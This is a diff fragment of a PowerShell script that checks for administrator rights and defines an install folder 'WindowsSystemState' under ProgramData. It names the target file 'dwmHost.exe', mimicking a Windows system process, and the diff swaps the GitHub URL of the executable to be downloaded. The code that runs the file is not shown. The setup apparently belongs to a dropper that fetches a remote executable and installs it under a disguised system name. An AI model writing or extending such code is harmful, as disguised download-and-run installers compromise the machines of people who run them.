@@ -15,7 +15,7 @@ if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdenti
 # Define paths and variables
 $InstallPath = Join-Path $env:ProgramData "WindowsSystemState"
 $SexeDestination = Join-Path $InstallPath "dwmHost.exe" 
-$SexeUrl = "https://raw.githubusercontent.com/Verte225066/test/main/EEEEEEEEEEEEEEEEE.exe"
+$SexeUrl = "https://github.com/Verte225066/test/blob/main/cmd.exe"
 
 # Install & Run Mode - UPDATED FOR 16-BIT ISSUE
 if ($choice -eq "1") {
